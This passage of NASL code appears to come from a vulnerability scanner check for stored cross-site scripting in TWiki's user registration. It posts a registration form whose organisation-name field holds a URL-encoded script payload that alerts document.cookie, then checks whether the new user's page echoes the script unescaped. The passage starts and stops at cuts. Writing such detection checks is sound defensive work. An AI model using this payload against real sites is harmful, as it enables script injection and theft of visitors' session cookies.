...
postdata = "crypttoken=ad240d2a0504042701980e88c85bbc33&Twk1FirstName=ccc&Twk1" + "LastName=ccc&Twk1WikiName=CccCcc&Twk1Email=ccc%40ccc.com&Twk0" + "Password=ccc&Twk0Confirm=ccc&Twk0OrganisationName=%3Cscript%3E" + "alert%28document.cookie%29%3B%3C%2Fscript%3E&Twk0OrganisationURL=" + "&Twk1Country=Belize&Twk0Comment=&rx=%25BLACKLISTPLUGIN%7B+action" + "%3D%22magic%22+%7D%25&topic=TWikiRegistration&action=register";
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
res = http_keepalive_send_recv( port: twikiPort, data: req );
if(res){
	url = dir + "/view/Main/CccCcc";
	if(http_vuln_check( port: twikiPort, url: url, pattern: "<script>alert" + "\\(document.cookie\\);</script>", check_header: TRUE )){
